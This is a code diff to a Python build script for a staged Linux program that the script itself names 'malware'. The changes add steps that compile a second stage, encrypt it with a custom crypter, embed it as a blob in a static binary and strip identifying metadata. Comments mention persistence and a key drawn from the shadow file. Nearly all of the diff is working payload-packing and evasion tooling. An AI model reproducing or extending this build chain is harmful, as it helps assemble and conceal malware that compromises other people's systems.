@@ -4,17 +4,12 @@ import shutil
 import re
 import os
 
-print("This program builds the entire malware and packs it into the initial stage.")
-
-print("Encoding Strings!")
-
 def bytes_to_c_arr(data, lowercase=True):
     return [format(b, '#04x' if lowercase else '#04X') for b in data]
 
 
 updated_lines = []
 lines = []
-
 
 with open("Stage1.c", "r") as s1_source:
     lines = s1_source.readlines()
@@ -57,7 +52,6 @@ with open("Stage1.c", "r") as s1_source:
 
 print("Writing out updated file!")
 
-
 with open("Stage1_processed.c", "w") as processed_file:
 
     replacing = False
@@ -73,20 +67,26 @@ with open("Stage1_processed.c", "w") as processed_file:
         else:
             processed_file.write(line)
 
+# Compile stage2
 os.system("gcc -s -O4 Stage2.c -o stage2")
+
+# Encrypt stage2 
+os.system("gcc -s aes.c Crypter.c -o crypter")
+os.system("./crypter stage2 {}".format(os.path.getsize("stage2")))
+
+# Save stage2 as blob
 os.system("objcopy -I binary -O elf64-x86-64 stage2 stage2.o")
-
-# TODO Encrypt stage2 
-
 # Build persistence, strip, minify, etc and converto blob, encrypt blob with known key (first line of shadow)
 # Build stage 2, link with blob, strip, minify, etc
 # Stage 1 - pack nested payloads
-
 os.system("gcc -Wall -Wextra -s -c aes.c -o aes.o")
 os.system("gcc -Wall -Wextra -s -O4 -funroll-loops -c Stage1_processed.c -o malware.o")
 os.system("gcc -static malware.o stage2.o aes.o -o malware")
 
+# Strip extra info from malware
 os.system("strip -R .comment malware")
 os.system("strip -R .note.gnu.property malware")
 os.system("strip -R .note.gnu.build-id malware")
 os.system("strip -R .note.ABI-tag malware")
+
+os.system("rm *.o")
